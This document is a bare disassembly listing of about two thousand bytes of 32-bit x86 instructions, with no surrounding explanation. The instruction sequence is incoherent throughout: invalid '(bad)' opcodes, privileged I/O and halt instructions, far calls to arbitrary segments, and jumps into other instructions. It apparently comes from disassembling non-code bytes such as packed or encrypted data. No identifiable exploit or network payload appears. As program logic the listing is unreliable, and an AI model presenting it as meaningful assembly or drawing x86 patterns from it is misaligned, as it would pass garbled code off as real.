  4070b0:	icebp  
  4070b1:	retf   
  4070b2:	or     al,0xdd
  4070b4:	push   ebp
  4070b5:	pop    edx
  4070b6:	push   ecx
  4070b7:	test   ah,bl
  4070b9:	sub    eax,0xcd30658f
  4070be:	jae    0x40706a
  4070c0:	xchg   edx,eax
  4070c1:	addr16 dec ebp
  4070c3:	mov    edx,0xca77cfbc
  4070c8:	aad    0xc5
  4070ca:	bound  edi,QWORD PTR [edx-0x15296ad1]
  4070d0:	in     eax,0x11
  4070d2:	retf   0xc75a
  4070d5:	xchg   edx,eax
  4070d6:	nop
  4070d7:	(bad)  
  4070d8:	pusha  
  4070d9:	call   0x1fd4:0x97b9f0d3
  4070e0:	or     esi,0x65
  4070e3:	jp     0x4070e3
  4070e5:	gs das 
  4070e7:	dec    esi
  4070e8:	sub    al,0x58
  4070ea:	retf   0x70a2
  4070ed:	enter  0xb3c5,0xec
  4070f1:	fdiv   DWORD PTR [edi+0x750ed010]
  4070f7:	and    DWORD PTR es:[ebx],0x2358d0bf
  4070fe:	mov    ecx,0x892deab8
  407103:	jmp    0x5788942a
  407108:	scas   al,BYTE PTR es:[edi]
  407109:	xchg   ebx,eax
  40710a:	ret    0x9ffe
  40710d:	mov    ah,0x26
  40710f:	mov    dh,0xa
  407111:	sub    BYTE PTR [ebx],ch
  407113:	ror    BYTE PTR ds:0xb4d55faa,0x32
  40711a:	sbb    BYTE PTR [esi-0x45f0b47c],0x2d
  407121:	adc    al,0xb8
  407123:	stos   BYTE PTR es:[edi],al
  407124:	int    0x30
  407126:	lods   al,BYTE PTR ds:[esi]
  407127:	mul    esp
  407129:	xor    BYTE PTR ds:0x440f714e,bh
  407130:	mov    al,ds:0x1db57cc0
  407135:	sub    eax,0xbdc882fe
  40713a:	ror    BYTE PTR [ebx+0x58dcf94f],1
  407140:	les    edi,FWORD PTR [ebx-0x44afe95c]
  407146:	cmp    esp,DWORD PTR ds:0x738cf36d
  40714c:	mov    WORD PTR [ebp+0x52a4593d],cs
  407152:	or     DWORD PTR [ebp+0x6a],edx
  407155:	jle    0x4070ef
  407157:	neg    BYTE PTR [esi-0x36614366]
  40715d:	adc    esi,ebx
  40715f:	xchg   DWORD PTR [ebx+edi*4],ebx
  407162:	or     BYTE PTR [eax+0x39],dl
  407165:	pop    edi
  407166:	sub    eax,0xa96defdc
  40716b:	mov    ah,0xed
  40716d:	or     BYTE PTR [eax+0x29],0xc9
  407171:	jmp    0xb91774fe
  407176:	ss jecxz 0x407175
  407179:	lahf   
  40717a:	sub    DWORD PTR [eax],ebp
  40717c:	sbb    DWORD PTR [edi],esp
  40717e:	sbb    eax,0xe07edeba
  407183:	push   ecx
  407184:	pop    ebx
  407185:	sub    ebx,DWORD PTR [esi]
  407187:	sbb    al,0xb2
  407189:	std    
  40718a:	hlt    
  40718b:	ja     0x407179
  40718d:	xchg   edi,eax
  40718e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40718f:	pop    ecx
  407190:	xchg   ebx,eax
  407191:	int    0x8e
  407193:	sbb    dh,dl
  407195:	(bad)  
  407196:	ss xchg esi,eax
  407198:	ss (bad) 
  40719a:	iret   
  40719b:	pop    ds
  40719c:	and    DWORD PTR [ebp-0x2c],ebx
  40719f:	idiv   BYTE PTR [edx-0x1be79b12]
  4071a5:	pop    es
  4071a6:	pop    eax
  4071a7:	mov    al,0xd7
  4071a9:	int    0x76
  4071ab:	xor    eax,0xd73fe91d
  4071b0:	out    0xe7,ax
  4071b3:	sbb    DWORD PTR ds:0xa47f3ab6,esp
  4071b9:	int    0x98
  4071bb:	out    dx,eax
  4071bc:	jnp    0x407165
  4071be:	lods   eax,DWORD PTR ds:[esi]
  4071bf:	neg    BYTE PTR [edi]
  4071c1:	fidivr WORD PTR [ebp+0x47]
  4071c4:	arpl   WORD PTR [ebx+eax*8-0x42],di
  4071c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c9:	jl     0x4071e1
  4071cb:	push   ss
  4071cc:	pushf  
  4071cd:	in     al,dx
  4071ce:	test   BYTE PTR [ebx],al
  4071d0:	mov    esp,0xda0609bb
  4071d5:	add    al,BYTE PTR [ebx]
  4071d7:	adc    DWORD PTR [ecx],esp
  4071d9:	fsubr  DWORD PTR [eax+eiz*1+0xbe8f780]
  4071e0:	stos   DWORD PTR es:[di],eax
  4071e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071e3:	push   esp
  4071e4:	imul   edi,DWORD PTR [ebx+0x2f],0x8c44915
  4071eb:	adc    BYTE PTR [ebp-0x7f],ah
  4071ee:	lahf   
  4071ef:	mov    dh,0x43
  4071f1:	data16 xor dl,BYTE PTR [ebx+0x40]
  4071f5:	lahf   
  4071f6:	inc    ebp
  4071f7:	fdiv   DWORD PTR [edx-0x32]
  4071fa:	ins    BYTE PTR es:[edi],dx
  4071fb:	dec    esi
  4071fc:	mov    dl,0xff
  4071fe:	pop    ebp
  4071ff:	jecxz  0x4071c4
  407201:	lea    ebp,[edi+0x2e51d19a]
  407207:	outs   dx,DWORD PTR ds:[esi]
  407208:	jl     0x4071de
  40720a:	stos   DWORD PTR es:[edi],eax
  40720b:	inc    esi
  40720c:	mov    ebp,0xed42e4d2
  407211:	nop
  407212:	add    eax,0x726fdc5
  407217:	xor    ch,ch
  407219:	dec    ebx
  40721a:	sbb    ecx,DWORD PTR [edx]
  40721c:	addr16 ja 0x407214
  40721f:	lea    esp,[ecx-0x41]
  407222:	mov    ds:0x49c53346,eax
  407227:	jl     0x40728b
  407229:	xor    BYTE PTR [edx+0x48a28c7f],ch
  40722f:	mov    ebp,0xec513b87
  407234:	lods   al,BYTE PTR ds:[esi]
  407235:	mov    dh,0x4b
  407237:	popa   
  407238:	daa    
  407239:	and    al,0x78
  40723b:	enter  0x9fa0,0x97
  40723f:	les    edi,FWORD PTR ds:0x4631228d
  407245:	call   0x8d85:0xcf780ea2
  40724c:	adc    DWORD PTR [edx+ecx*8],edi
  40724f:	int    0xe9
  407251:	test   DWORD PTR [ebx],eax
  407253:	jnp    0x4072b9
  407255:	outs   dx,BYTE PTR ds:[esi]
  407256:	fucom  st(6)
  407258:	pop    es
  407259:	ret    
  40725a:	sub    al,0x9e
  40725c:	mov    eax,ds:0xe0282191
  407261:	jbe    0x4072ca
  407263:	(bad)  
  407265:	mov    ah,0x27
  407267:	lods   al,BYTE PTR ds:[esi]
  407268:	enter  0xe529,0x46
  40726c:	aas    
  40726d:	pop    esi
  40726e:	call   0xf74d169f
  407273:	jnp    0x40725b
  407275:	jg     0x40722e
  407277:	das    
  407278:	jae    0x40725e
  40727a:	pop    es
  40727b:	push   ds
  40727c:	in     eax,dx
  40727d:	mov    ebx,0x2522f8b1
  407282:	mov    al,ds:0x358ee9ef
  407287:	cmp    eax,0xca6b1216
  40728c:	pop    ds
  40728d:	xchg   edx,eax
  40728e:	lds    edi,FWORD PTR [edx]
  407290:	jecxz  0x4072ea
  407292:	cmp    al,0x5e
  407294:	icebp  
  407295:	cmp    DWORD PTR [esi],ecx
  407297:	retf   
  407298:	xor    dl,dl
  40729a:	hlt    
  40729b:	jo     0x4072c9
  40729d:	shr    BYTE PTR [edx],0xf9
  4072a0:	cli    
  4072a1:	mov    al,0xb7
  4072a3:	sbb    al,0xa5
  4072a5:	jl     0x4072c8
  4072a7:	and    ebp,DWORD PTR es:[ecx-0x2e]
  4072ab:	inc    ecx
  4072ac:	jmp    0x407297
  4072ae:	icebp  
  4072af:	sbb    eax,0xbb9d0f61
  4072b4:	stc    
  4072b5:	lods   eax,DWORD PTR ds:[esi]
  4072b6:	and    al,0x36
  4072b8:	jns    0x4072a8
  4072ba:	mov    ebp,0x9156e8c1
  4072bf:	add    ecx,0x55
  4072c2:	cmp    al,0x1e
  4072c4:	in     eax,dx
  4072c5:	add    al,0xc5
  4072c7:	jmp    0x640e:0x9adb903d
  4072ce:	mov    BYTE PTR [edi+0x4d],dl
  4072d1:	and    esp,DWORD PTR ds:0x981b54d2
  4072d7:	not    bh
  4072d9:	pop    es
  4072da:	ret    0xbffa
  4072dd:	retf   
  4072de:	xor    eax,0x27e589f9
  4072e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072e4:	in     al,0xdd
  4072e6:	push   ds
  4072e7:	nop
  4072e8:	xchg   ebp,eax
  4072e9:	imul   BYTE PTR [eax-0x3a459d99]
  4072ef:	daa    
  4072f0:	mov    DWORD PTR [eax+ecx*1],edx
  4072f3:	sbb    al,BYTE PTR [ebx]
  4072f5:	inc    ecx
  4072f6:	adc    DWORD PTR [esp+ebx*2-0x4c],0xffffffe1
  4072fb:	xor    BYTE PTR [ecx-0x235b35a0],0xe2
  407302:	pop    ecx
  407303:	sub    edx,DWORD PTR [edx]
  407305:	sti    
  407306:	bound  esi,QWORD PTR [edi]
  407308:	add    DWORD PTR [edx],0xb75d4b88
  40730e:	fdiv   QWORD PTR [esi]
  407310:	push   ss
  407311:	jns    0x4072b8
  407313:	mov    ch,ch
  407315:	fwait
  407316:	repnz xchg edx,eax
  407318:	push   cs
  407319:	dec    esp
  40731a:	xchg   esi,eax
  40731b:	outs   dx,BYTE PTR ds:[esi]
  40731c:	push   ebx
  40731d:	mov    WORD PTR [edx-0x10473cf8],?
  407323:	jl     0x4072bb
  407325:	cmp    DWORD PTR [edi-0xe],esp
  407328:	pop    esi
  407329:	adc    DWORD PTR [edi],ecx
  40732b:	out    0x16,eax
  40732d:	daa    
  40732e:	(bad)  
  40732f:	ror    bp,cl
  407332:	sti    
  407333:	jl     0x40732c
  407335:	and    BYTE PTR [edx-0x2923f3f0],bl
  40733b:	cmp    eax,0xcc53a4b3
  407340:	out    dx,eax
  407341:	jnp    0x40731d
  407343:	fnstcw WORD PTR [esi-0x6]
  407346:	std    
  407347:	jnp    0x40736a
  407349:	fidiv  DWORD PTR [esi]
  40734b:	xor    dl,BYTE PTR ds:0x809c30f0
  407351:	lock call 0x47e38263
  407357:	ins    BYTE PTR es:[edi],dx
  407358:	jge    0x4072ef
  40735a:	lods   al,BYTE PTR gs:[esi]
  40735c:	(bad)  
  40735e:	fdiv   QWORD PTR [ebp+0xb2cfe30]
  407364:	and    ah,ah
  407366:	mov    edi,DWORD PTR [esi]
  407368:	cli    
  407369:	add    DWORD PTR [ecx],ecx
  40736b:	add    DWORD PTR [esi-0x46],0x84185039
  407372:	scas   al,BYTE PTR es:[edi]
  407373:	push   0x33
  407375:	std    
  407376:	push   0xf21dd205
  40737b:	loop   0x4073b8
  40737d:	ret    0xf777
  407380:	xor    eax,0x624eae23
  407385:	xlat   BYTE PTR ds:[ebx]
  407386:	xchg   DWORD PTR [eax+0x16],esp
  407389:	ret    
  40738a:	stos   DWORD PTR es:[edi],eax
  40738b:	mov    dh,0x73
  40738d:	push   ss
  40738e:	dec    ebp
  40738f:	xchg   BYTE PTR [ebp-0x20],ah
  407392:	icebp  
  407393:	pop    eax
  407394:	repnz (bad) 
  407396:	pop    esp
  407397:	and    eax,0x5ea57d7b
  40739c:	jo     0x4073f4
  40739e:	out    0x80,eax
  4073a0:	into   
  4073a1:	push   cs
  4073a2:	pushf  
  4073a3:	cwde   
  4073a4:	jo     0x4073d9
  4073a6:	add    bh,BYTE PTR [esi-0x26]
  4073a9:	push   ebx
  4073aa:	aas    
  4073ab:	mov    ch,0x13
  4073ad:	xchg   al,dh
  4073af:	ss out 0x3d,al
  4073b2:	jne    0x4073ab
  4073b4:	mov    dh,0xe0
  4073b6:	adc    al,0x63
  4073b8:	lahf   
  4073b9:	or     eax,0x15e6166d
  4073be:	(bad)
  4073c3:	lods   eax,DWORD PTR ds:[esi]
  4073c4:	mov    dh,0xf4
  4073c6:	cdq    
  4073c7:	test   al,0xb1
  4073c9:	hlt    
  4073ca:	stc    
  4073cb:	cwde   
  4073cc:	mov    ds:0xe8cc8967,al
  4073d1:	lea    esp,[ebx]
  4073d3:	sbb    bh,dl
  4073d5:	stos   BYTE PTR es:[edi],al
  4073d6:	cmp    bl,BYTE PTR [esi+0x17]
  4073d9:	sbb    al,0x19
  4073db:	mov    bl,0x70
  4073dd:	xchg   edi,eax
  4073de:	and    BYTE PTR [ebp+0xc],bl
  4073e1:	or     DWORD PTR [eax-0xc],esp
  4073e4:	or     DWORD PTR ds:0xb2264953,0xb8918c40
  4073ee:	fild   QWORD PTR [ecx+0x1bec7a5]
  4073f4:	and    dh,BYTE PTR [edx+0x2f1584c8]
  4073fa:	cs pop edi
  4073fc:	fwait
  4073fd:	inc    ecx
  4073fe:	(bad)  
  407400:	mov    DWORD PTR [edx+0x7cc22955],esi
  407406:	data16 xor BYTE PTR [ebx*2-0x34bb5eda],dh
  40740e:	pop    ds
  40740f:	sbb    al,0x54
  407411:	outs   dx,DWORD PTR ds:[esi]
  407412:	add    eax,0x5767ba0e
  407417:	fs sub eax,0xc11f0735
  40741d:	js     0x407403
  40741f:	mov    eax,ds:0x94e52645
  407424:	outs   dx,BYTE PTR ds:[esi]
  407425:	fld    DWORD PTR [edx+0x35]
  407428:	mov    DWORD PTR ds:0x2caf9692,esp
  40742e:	sahf   
  40742f:	iret   
  407430:	add    ax,0x1fae
  407434:	sbb    al,0x8d
  407436:	mov    bh,0xeb
  407438:	jmp    0x2397:0xe870b484
  40743f:	jecxz  0x4073ea
  407441:	clc    
  407442:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407443:	pop    esp
  407444:	pop    ecx
  407445:	icebp  
  407446:	mov    bl,BYTE PTR [eax-0x2ec4e0c2]
  40744c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40744d:	fnstcw WORD PTR [edi]
  40744f:	sub    esp,DWORD PTR [esi+eiz*1]
  407452:	cs push 0xffffffb3
  407455:	mov    dl,0x39
  407457:	cmc    
  407458:	pop    edi
  407459:	push   esi
  40745a:	pop    ebp
  40745b:	into   
  40745c:	sub    bl,BYTE PTR [ebx]
  40745e:	dec    esp
  40745f:	ins    DWORD PTR es:[edi],dx
  407460:	mov    cl,0x30
  407462:	test   eax,0xd4e465cb
  407467:	or     eax,0x9784e774
  40746c:	dec    esp
  40746d:	sub    dl,ch
  40746f:	add    DWORD PTR ds:0x431276a,eax
  407475:	xchg   DWORD PTR [edx],esp
  407477:	daa    
  407478:	lods   eax,DWORD PTR ds:[esi]
  407479:	aad    0x2a
  40747b:	pushf  
  40747c:	adc    bh,al
  40747e:	xchg   BYTE PTR [eax-0x64],dl
  407481:	pop    esi
  407482:	mov    ebx,0x3add6afa
  407487:	fnsetpm(287 only) 
  407489:	mov    edi,0xdc5bc235
  40748e:	add    edx,DWORD PTR [ebx+0x7b0555b1]
  407494:	xor    DWORD PTR [eax+edx*4-0x34],edi
  407498:	retf   0xff43
  40749b:	push   ebx
  40749c:	cmp    cl,bh
  40749e:	pop    esp
  40749f:	hlt    
  4074a0:	pop    edx
  4074a1:	sub    al,0xa8
  4074a3:	ss dec ebp
  4074a5:	repnz or DWORD PTR es:[eax+ecx*4],ecx
  4074aa:	outs   dx,BYTE PTR ds:[esi]
  4074ab:	vunpckhpd ymm4,ymm3,YMMWORD PTR [edi+0x16]
  4074b0:	stos   BYTE PTR es:[edi],al
  4074b1:	and    eax,0x8c702047
  4074b6:	hlt    
  4074b7:	leave  
  4074b8:	xchg   DWORD PTR [edx],esp
  4074ba:	les    ebx,FWORD PTR cs:[ecx-0x22]
  4074be:	or     al,0x8f
  4074c0:	sub    BYTE PTR [eax],ch
  4074c2:	lock cmp ebp,ebx
  4074c5:	sub    eax,0x2eae7b09
  4074ca:	dec    eax
  4074cb:	ins    DWORD PTR es:[edi],dx
  4074cc:	add    al,0xfd
  4074ce:	sub    eax,0x5d3477e4
  4074d3:	jnp    0x4074b6
  4074d5:	xchg   edx,eax
  4074d6:	cmp    al,0x39
  4074d8:	mov    esi,0x78210218
  4074dd:	pop    ebx
  4074de:	shl    DWORD PTR [esi+0x2977c3b2],1
  4074e4:	or     edi,edi
  4074e6:	push   edx
  4074e7:	lea    edx,[ebx-0x47]
  4074ea:	cmp    BYTE PTR [edi+0x2e],bh
  4074ed:	ret    0x9e25
  4074f0:	inc    edx
  4074f1:	xor    eax,0xd0ead77a
  4074f6:	cmp    ebp,esi
  4074f8:	test   eax,0x982b57ca
  4074fd:	inc    eax
  4074fe:	aam    0xa6
  407500:	mov    bl,0x89
  407502:	gs (bad) 
  407504:	fcomp  QWORD PTR [edi+0x719ae043]
  40750a:	(bad)  [eax]
  40750c:	ins    BYTE PTR es:[edi],dx
  40750d:	ret    0x7e9
  407510:	pop    esi
  407511:	mov    BYTE PTR [ebp-0x5d],dl
  407514:	das    
  407515:	lahf   
  407516:	push   edx
  407517:	out    0x28,al
  407519:	add    al,0xef
  40751b:	jo     0x4074a0
  40751d:	mov    esi,0x25435db4
  407522:	(bad)  
  407524:	cmovs  edx,DWORD PTR [edx+0x28caee0f]
  40752b:	and    bl,al
  40752d:	sbb    ebp,DWORD PTR [ebx-0x2a7e8afa]
  407533:	sub    BYTE PTR [edi+eiz*2],0x63
  407537:	and    DWORD PTR [esp+edx*8+0x164e4088],eax
  40753e:	aas    
  40753f:	or     al,0xaf
  407541:	push   ss
  407542:	xor    cl,bh
  407544:	mov    esi,0x350a663b
  407549:	push   esp
  40754a:	jmp    0xdb74b06f
  40754f:	adc    bl,BYTE PTR [ebp+edi*2+0x5c94b80e]
  407556:	jae    0x4074de
  407558:	les    edx,FWORD PTR [ebx]
  40755a:	push   0x169a880c
  40755f:	jecxz  0x407543
  407561:	jne    0x40750f
  407563:	leave  
  407564:	adc    dh,dh
  407566:	sbb    al,0x52
  407568:	mov    cl,0xe3
  40756a:	js     0x407511
  40756c:	ror    DWORD PTR [eax],cl
  40756e:	fild   WORD PTR [eax-0x5b]
  407571:	inc    ebp
  407572:	sub    al,0xff
  407574:	retf   0x5a63
  407577:	xor    eax,0x651a4cdf
  40757c:	into   
  40757d:	pop    esi
  40757e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40757f:	nop
  407580:	mov    ecx,esi
  407582:	ret    0x5935
  407585:	and    ebx,edx
  407587:	jmp    0x79a1:0x124fba02
  40758e:	aam    0x48
  407590:	cmp    BYTE PTR [edi+0x2d7a4278],dh
  407596:	xchg   edi,eax
  407597:	dec    ebp
  407598:	and    eax,edx
  40759a:	xchg   edi,eax
  40759b:	nop
  40759c:	in     al,0xaf
  40759e:	imul   ebp,DWORD PTR [ebx],0x8d8e402a
  4075a4:	sbb    eax,0xb08bbf48
  4075a9:	cmc    
  4075aa:	gs add eax,0x4026ebdd
  4075b0:	push   eax
  4075b1:	sub    ecx,DWORD PTR [edi-0x71490ad1]
  4075b7:	fdiv   DWORD PTR [ebp-0x102669c3]
  4075bd:	retf   
  4075be:	bound  esi,QWORD PTR [ebx+edi*2-0x5a]
  4075c2:	mov    edx,0x9402ab82
  4075c8:	popf   
  4075c9:	fiadd  WORD PTR [edx]
  4075cb:	push   esp
  4075cc:	stos   DWORD PTR es:[edi],eax
  4075cd:	pop    eax
  4075ce:	jle    0x4075e3
  4075d0:	rcl    BYTE PTR [ebp-0x5],0x1b
  4075d4:	mov    WORD PTR [eax+ecx*2+0x4ab335a7],es
  4075db:	ins    DWORD PTR es:[edi],dx
  4075dc:	sti    
  4075dd:	test   eax,ebp
  4075df:	add    al,0xe2
  4075e1:	fmul   st,st(4)
  4075e3:	cmp    bh,BYTE PTR [esp-0x57996c8a]
  4075ea:	call   0x393:0x30ef1617
  4075f1:	(bad)  
  4075f2:	call   0xdffad3af
  4075f7:	pushf  
  4075f8:	jecxz  0x40758c
  4075fa:	test   BYTE PTR [ebx+0xc],ah
  4075fd:	test   al,0x41
  4075ff:	push   ss
  407600:	into   
  407601:	stos   DWORD PTR es:[edi],eax
  407602:	xchg   ebx,eax
  407603:	stc    
  407604:	or     eax,0x243daddb
  407609:	ins    BYTE PTR es:[edi],dx
  40760a:	loop   0x4075d9
  40760c:	les    ebp,FWORD PTR [edx-0xeca2f18]
  407612:	jae    0x407685
  407614:	and    BYTE PTR [esi+ebx*1],dl
  407617:	dec    ebp
  407618:	dec    edi
  407619:	sahf   
  40761a:	jmp    0xa4ce:0x18bc5984
  407621:	(bad)  
  407624:	jl     0x40764b
  407626:	leave  
  407627:	push   ss
  407628:	gs pushf 
  40762a:	repnz pushf 
  40762c:	pop    edi
  40762d:	retf   0xd231
  407630:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407631:	repz (bad) 
  407633:	or     al,al
  407635:	mov    DWORD PTR [esi+0x160e08ba],edx
  40763b:	xchg   ecx,eax
  40763c:	and    al,0x39
  40763e:	in     al,0x98
  407640:	stc    
  407641:	and    DWORD PTR fs:[eax+0x4a],ecx
  407645:	inc    ebp
  407646:	in     al,dx
  407647:	mov    edx,0xe1547712
  40764c:	and    bl,al
  40764e:	xor    DWORD PTR [ebp-0x3c],esi
  407651:	or     BYTE PTR [eax-0x59],bh
  407654:	mov    eax,eax
  407656:	add    al,0xe0
  407658:	pushf  
  407659:	in     eax,dx
  40765a:	data16 jns 0x40769d
  40765d:	inc    ecx
  40765e:	push   esp
  40765f:	cmp    DWORD PTR [edi+0x735a3f04],ecx
  407665:	in     eax,0xba
  407667:	leave  
  407668:	mov    ecx,0x3c8e090d
  40766d:	les    ebp,FWORD PTR [ebp-0x25]
  407670:	jge    0x4076ea
  407672:	nop
  407673:	das    
  407674:	outs   dx,BYTE PTR ds:[esi]
  407675:	out    dx,eax
  407676:	cmp    DWORD PTR [eax+edi*8-0x31],0xfffffff0
  40767b:	push   edi
  40767c:	xor    bl,BYTE PTR [edx-0xc]
  40767f:	fwait
  407680:	imul   ecx,DWORD PTR [ecx],0x45a846d
  407686:	sar    DWORD PTR [ebp-0x27],1
  407689:	dec    esp
  40768a:	or     cl,BYTE PTR [ecx]
  40768c:	in     al,0xac
  40768e:	push   es
  40768f:	cld    
  407690:	nop
  407691:	and    ecx,ecx
  407693:	add    dl,BYTE PTR [eax-0x68a1d3ba]
  407699:	lock xor dh,BYTE PTR [edx]
  40769c:	mov    ebp,DWORD PTR [edi+0x3f]
  40769f:	mov    ds:0x49c0556e,al
  4076a4:	push   esi
  4076a5:	push   ss
  4076a6:	(bad)  
  4076a7:	ret    
  4076a8:	and    DWORD PTR [ecx-0x29],0x69f6183
  4076af:	call   0x1902:0x62c46b9a
  4076b6:	sbb    al,0x98
  4076b8:	mov    DWORD PTR [ebx+0x33465268],edx
  4076be:	ret    0xe1f8
  4076c1:	lahf   
  4076c2:	pop    eax
  4076c3:	push   ss
  4076c4:	or     cl,dh
  4076c6:	dec    edi
  4076c7:	(bad)  
  4076c8:	adc    al,bl
  4076ca:	lea    edx,[esi]
  4076cc:	int3   
  4076cd:	mov    edi,0x58213b07
  4076d2:	or     ch,BYTE PTR [ecx]
  4076d4:	or     eax,0x802398a1
  4076d9:	dec    esp
  4076da:	sub    ebp,DWORD PTR [esi+edx*8+0x26]
  4076de:	into   
  4076df:	push   0x6
  4076e1:	jmp    FWORD PTR ds:0x4c6b5da4
  4076e7:	(bad)  
  4076e8:	in     al,0x13
  4076ea:	sbb    al,0xf8
  4076ec:	mov    dl,0x6e
  4076ee:	jbe    0x4076a0
  4076f0:	fisub  DWORD PTR [edi-0x2b]
  4076f3:	mov    ecx,0xd3c0dca7
  4076f8:	sahf   
  4076f9:	cmp    eax,0x5c6adb31
  4076fe:	jnp    0x40770c
  407700:	xlat   BYTE PTR ds:[ebx]
  407701:	loope  0x407745
  407703:	inc    esi
  407704:	push   ds
  407705:	push   ds
  407706:	mov    dh,0xd5
  407708:	cmp    bh,bh
  40770a:	jg     0x407735
  40770c:	jae    0x4076c7
  40770e:	pop    ecx
  40770f:	sub    edi,ebp
  407711:	hlt    
  407712:	pop    ss
  407713:	pop    es
  407714:	inc    edx
  407715:	iret   
  407716:	jecxz  0x40774a
  407718:	dec    esp
  407719:	aas    
  40771a:	(bad)  
  40771b:	scas   eax,DWORD PTR es:[edi]
  40771c:	or     BYTE PTR [edi+eiz*4],cl
  40771f:	sub    dh,dl
  407721:	push   es
  407722:	sbb    edi,DWORD PTR [ebx-0x5e]
  407725:	in     al,dx
  407726:	lds    ebp,FWORD PTR [ebx+ebx*2-0x18]
  40772a:	cdq    
  40772b:	mov    ch,0xe5
  40772d:	push   ss
  40772e:	xchg   edx,eax
  40772f:	ss cmc 
  407731:	gs cdq 
  407733:	push   0x4
  407735:	call   0xd18a:0x14d49041
  40773c:	mov    al,BYTE PTR [esi]
  40773e:	pop    eax
  40773f:	pop    ds
  407740:	out    dx,eax
  407741:	in     al,0xc2
  407743:	(bad)  
  407744:	aas    
  407745:	gs mov bh,0x2c
  407748:	mov    ebp,0xc0ebb987
  40774d:	imul   edx,DWORD PTR [ebx-0x30],0xda0e6d73
  407754:	ret    0x114f
  407757:	das    
  407758:	mov    edx,0x7485b2ef
  40775d:	jg     0x4077a5
  40775f:	pop    es
  407760:	cdq    
  407761:	lds    edi,FWORD PTR [edx]
  407763:	shl    BYTE PTR [esp+ebx*2+0x64f2c89b],1
  40776a:	mov    edx,0xb46c9ea3
  40776f:	lock mov BYTE PTR [di-0x1d],dh
  407774:	xor    BYTE PTR [ecx-0x49],cl
  407777:	in     al,dx
  407778:	cdq    
  407779:	inc    ecx
  40777a:	data16 jmp 0x407754
  40777d:	add    DWORD PTR [edi],ebp
  40777f:	addr16 inc esi
  407781:	mov    edx,0x1457569
  407786:	cld    
  407787:	add    DWORD PTR [edi-0x6627c810],ebx
  40778d:	add    DWORD PTR [ebx+0x68],0xffffff9c
  407791:	jge    0x407757
  407793:	(bad)  
  407794:	xchg   edi,eax
  407795:	mov    cl,BYTE PTR [ecx]
  407797:	push   ebp
  407798:	jl     0x407813
  40779a:	mov    DWORD PTR [ecx+0x7],edx
  40779d:	je     0x4077d8
  40779f:	pop    edi
  4077a0:	ds push es
  4077a2:	push   ebx
  4077a3:	inc    eax
  4077a4:	jmp    0x407824
  4077a6:	cdq    
  4077a7:	sahf   
  4077a8:	inc    eax
  4077a9:	xchg   ah,cl
  4077ab:	adc    ecx,edx
  4077ad:	test   DWORD PTR [ebx],0xc8b8bd4f
  4077b3:	popa   
  4077b4:	ror    DWORD PTR [eax],1
  4077b6:	or     DWORD PTR [ebp-0x3cdd2c9],esi
  4077bc:	test   al,0x56
  4077be:	rcl    DWORD PTR [ecx+0x670a6cdc],1
  4077c4:	test   BYTE PTR [eax-0xf5d9484],bh
  4077ca:	loopne 0x407768
  4077cc:	pusha  
  4077cd:	jecxz  0x40778e
  4077cf:	jmp    0x4077a7
  4077d1:	mov    WORD PTR [ecx-0x5c59e4a1],?
  4077d7:	leave  
  4077d8:	push   edi
  4077d9:	push   0x74
  4077db:	or     cl,ch
  4077dd:	inc    edi
  4077de:	push   eax
  4077df:	xchg   edi,eax
  4077e0:	mov    bl,0x5b
  4077e2:	add    DWORD PTR [edi],ecx
  4077e4:	jg     0x4077bc
  4077e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077e7:	push   esi
  4077e8:	xor    al,0xef
  4077ea:	mov    bh,0x3f
  4077ec:	sub    cl,BYTE PTR [ecx+0x70a4a923]
  4077f2:	jg     0x40785d
  4077f4:	mov    eax,ds:0xa467753c
  4077f9:	scas   al,BYTE PTR es:[edi]
  4077fa:	ins    DWORD PTR es:[edi],dx
  4077fb:	hlt    
  4077fc:	sbb    al,0x66
  4077fe:	into   
  4077ff:	(bad)  
  407800:	fld    TBYTE PTR [edx]
  407802:	sahf   
  407803:	push   edx
  407804:	das    
  407805:	adc    BYTE PTR [esi+ecx*4-0x77],al
  407809:	imul   eax,DWORD PTR [eax],0xffffff9a
  40780c:	sbb    DWORD PTR [eax+esi*4-0x76],esi
  407810:	dec    edx
  407811:	jb     0x407887
  407813:	jnp    0x4077fa
  407815:	int    0x13
  407817:	fmul   QWORD PTR [esi-0x646eb4a7]
  40781d:	mov    edx,0xd4e8a25
  407822:	rcr    DWORD PTR [esi+0x62],cl
  407825:	xor    al,0x94
  407827:	sub    al,0x4a
  407829:	hlt    
  40782a:	lods   eax,DWORD PTR ds:[esi]
  40782b:	xor    BYTE PTR [edi],cl
  40782d:	add    BYTE PTR [ebx],ah
  40782f:	and    DWORD PTR [eax+0x3a],edi
  407832:	sbb    BYTE PTR [esi+edi*4-0x1],0x23
  407837:	jnp    0x40789c
  407839:	repz sbb eax,0xe35aa3e3
  40783f:	add    al,0x24
  407841:	pop    esp
  407842:	jg     0x40783e
  407844:	mov    ch,0xc1
  407846:	inc    esp
  407847:	add    bh,al
  407849:	jno    0x4077f1
  40784b:	nop
  40784c:	sub    DWORD PTR [eax-0x28284842],esp
  407852:	outs   dx,DWORD PTR ds:[esi]
  407853:	test   BYTE PTR [edx+esi*1-0x5bd9278e],ah
  40785a:	cwde   
  40785b:	jmp    0x86cc:0xdd037e3a
  407862:	fild   WORD PTR [ecx-0x693bd29e]
  407868:	add    DWORD PTR [esi],ebp
  40786a:	add    DWORD PTR [edx-0x26daec40],eax
  407870:	leave  
  407871:	lods   al,BYTE PTR ds:[esi]
  407872:	mov    eax,0xad4daeca
  407877:	ins    BYTE PTR es:[edi],dx
  407878:	scas   eax,DWORD PTR es:[edi]
  407879:	clc    
  40787a:	dec    eax
  40787b:	sub    edi,eax
  40787d:	rcl    BYTE PTR [edx],1
  40787f:	jl     0x4078be
  407881:	inc    esp
  407882:	stos   DWORD PTR es:[edi],eax
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407885:	lahf   
  407886:	sub    eax,0xf38ddebc
  40788b:	sub    eax,0x539d891c
  407890:	sbb    bh,cl
  407892:	or     bl,dl
